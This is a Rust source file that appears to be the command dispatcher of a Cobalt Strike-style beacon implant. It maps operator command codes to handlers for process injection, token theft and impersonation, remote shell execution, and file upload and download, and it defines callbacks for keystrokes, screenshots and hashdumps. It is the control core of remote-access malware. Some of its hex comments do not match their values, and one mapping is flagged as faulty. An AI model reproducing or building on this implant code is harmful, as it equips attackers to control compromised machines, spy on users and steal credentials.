use crate::beacon::bof::bof_loader;
use crate::beacon::sleep::beacon_sleep;
use crate::beacon::exit::beacon_exit;
use crate::beacon::file::{cp, download, file_browse, list_drives, mkdir, mv, rm, upload};
use crate::beacon::proc::{kill_process, ps};
use crate::beacon::shell::{execute, pwd, shell};
use crate::beacon::spawn_and_inject::{inject_dll, job_handle, spawn_and_inject_dll};
use crate::beacon::token::{get_privs, make_token, rev2self, runas, steal_token};
use std::io::Cursor;

/// Command types
pub const CMD_TYPE_SPAWN_IGNORE_TOKEN_X86: u32 = 1; // 0x01
pub const CMD_TYPE_EXIT: u32 = 3; // 0x03
pub const CMD_TYPE_SLEEP: u32 = 4; // 0x04
pub const CMD_TYPE_CD: u32 = 5; // 0x05
pub const CMD_TYPE_INJECT_X86: u32 = 9; // 0x09
pub const CMD_TYPE_UPLOAD_START: u32 = 10; // 0x0A
pub const CMD_TYPE_DOWNLOAD: u32 = 11; // 0x0B
pub const CMD_TYPE_EXECUTE: u32 = 12; // 0x0C
pub const CMD_TYPE_REV2SELF: u32 = 28; // 0x1C
pub const CMD_TYPE_STEAL_TOKEN: u32 = 31; // 0x1F
pub const CMD_TYPE_PS: u32 = 32; // 0x20
pub const CMD_TYPE_KILL: u32 = 33; // 0x21
pub const CMD_TYPE_RUNAS: u32 = 38; // 0x26
pub const CMD_TYPE_PWD: u32 = 39; // 0x27
pub const CMD_TYPE_JOB: u32 = 40; // 0x2A
pub const CMD_TYPE_INJECT_X64: u32 = 43; // 0x2B
pub const CMD_TYPE_SPAWN_IGNORE_TOKEN_X64: u32 = 44; // 0x2C
pub const CMD_TYPE_MAKE_TOKEN: u32 = 49; // 0x31
pub const CMD_TYPE_FILE_BROWSE: u32 = 53; // 0x35
pub const CMD_TYPE_MKDIR: u32 = 54; // 0x36
pub const CMD_TYPE_DRIVES: u32 = 55; // 0x37
pub const CMD_TYPE_RM: u32 = 56; // 0x38
pub const CMD_TYPE_UPLOAD_LOOP: u32 = 67; // 0x43
pub const CMD_TYPE_CP: u32 = 73; // 0x49
pub const CMD_TYPE_MV: u32 = 74; // 0x4A
pub const CMD_TYPE_GET_PRIVS: u32 = 77; // 0x4D
pub const CMD_TYPE_SHELL: u32 = 78; // 0x4E
pub const CMD_TYPE_SPAWN_TOKEN_X86: u32 = 89; // 0x59
pub const CMD_TYPE_SPAWN_TOKEN_X64: u32 = 90; // 0x5A
pub const CMD_TYPE_BOF: u32 = 100; // 0x69
pub const CMD_TYPE_JOB_REGISTER_MSGMODE: u32 = 101; // 0x65

pub fn command_handle(cmd_type: u32, cmd: Cursor<Vec<u8>>) {
    match cmd_type {
        CMD_TYPE_SPAWN_IGNORE_TOKEN_X86 => spawn_and_inject_dll(cmd, false, true),
        CMD_TYPE_EXIT => beacon_exit(),
        CMD_TYPE_SLEEP => beacon_sleep(cmd),
        CMD_TYPE_INJECT_X86 => inject_dll(cmd, false),
        CMD_TYPE_UPLOAD_START => upload(cmd, true),
        CMD_TYPE_DOWNLOAD => download(cmd),
        CMD_TYPE_EXECUTE => execute(cmd),
        CMD_TYPE_REV2SELF => rev2self(),
        CMD_TYPE_STEAL_TOKEN => steal_token(cmd),
        CMD_TYPE_PS => ps(cmd),
        CMD_TYPE_KILL => kill_process(cmd),
        CMD_TYPE_RUNAS => runas(cmd),
        CMD_TYPE_PWD => pwd(),
        CMD_TYPE_JOB => job_handle(cmd),
        CMD_TYPE_INJECT_X64 => inject_dll(cmd, true),
        CMD_TYPE_SPAWN_IGNORE_TOKEN_X64 => spawn_and_inject_dll(cmd, true, true),
        CMD_TYPE_MAKE_TOKEN => make_token(cmd),
        CMD_TYPE_FILE_BROWSE => file_browse(cmd),
        CMD_TYPE_MKDIR => mkdir(cmd),
        CMD_TYPE_DRIVES => list_drives(cmd),
        CMD_TYPE_RM => rm(cmd),
        CMD_TYPE_UPLOAD_LOOP => upload(cmd, false),
        CMD_TYPE_CP => cp(cmd),
        CMD_TYPE_MV => mv(cmd),
        CMD_TYPE_GET_PRIVS => get_privs(cmd),
        CMD_TYPE_SHELL => shell(cmd),
        CMD_TYPE_SPAWN_TOKEN_X86 => spawn_and_inject_dll(cmd, false, false),
        CMD_TYPE_SPAWN_TOKEN_X64 => spawn_and_inject_dll(cmd, true, false),
        CMD_TYPE_BOF => bof_loader(cmd),
        /// 有问题
        CMD_TYPE_JOB_REGISTER_MSGMODE => job_handle(cmd),
        _ => println!("UNKNOWN: cmd_content: {:?}", cmd_type),
    }
}

/// Callback types
pub const CALLBACK_OUTPUT: u32 = 0;
pub const CALLBACK_KEYSTROKES: u32 = 1;
pub const CALLBACK_FILE: u32 = 2;
pub const CALLBACK_SCREENSHOT: u32 = 3;
pub const CALLBACK_CLOSE: u32 = 4;
pub const CALLBACK_READ: u32 = 5;
pub const CALLBACK_CONNECT: u32 = 6;
pub const CALLBACK_PING: u32 = 7;
pub const CALLBACK_FILE_WRITE: u32 = 8;
pub const CALLBACK_FILE_CLOSE: u32 = 9;
pub const CALLBACK_PIPE_OPEN: u32 = 10;
pub const CALLBACK_PIPE_CLOSE: u32 = 11;
pub const CALLBACK_PIPE_READ: u32 = 12;
pub const CALLBACK_POST_ERROR: u32 = 13;
pub const CALLBACK_PIPE_PING: u32 = 14;
pub const CALLBACK_TOKEN_STOLEN: u32 = 15;
pub const CALLBACK_TOKEN_GETUID: u32 = 16;
pub const CALLBACK_PROCESS_LIST: u32 = 17;
pub const CALLBACK_POST_REPLAY_ERROR: u32 = 18;
pub const CALLBACK_PWD: u32 = 19;
pub const CALLBACK_LIST_JOBS: u32 = 20;
pub const CALLBACK_HASHDUMP: u32 = 21;
pub const CALLBACK_PENDING: u32 = 22;
pub const CALLBACK_ACCEPT: u32 = 23;
pub const CALLBACK_NETVIEW: u32 = 24;
pub const CALLBACK_PORTSCAN: u32 = 25;
pub const CALLBACK_DEAD: u32 = 26;
pub const CALLBACK_SSH_STATUS: u32 = 27;
pub const CALLBACK_CHUNK_ALLOCATE: u32 = 28;
pub const CALLBACK_CHUNK_SEND: u32 = 29;
pub const CALLBACK_OUTPUT_OEM: u32 = 30;
pub const CALLBACK_ERROR: u32 = 31;
pub const CALLBACK_OUTPUT_UTF8: u32 = 32;
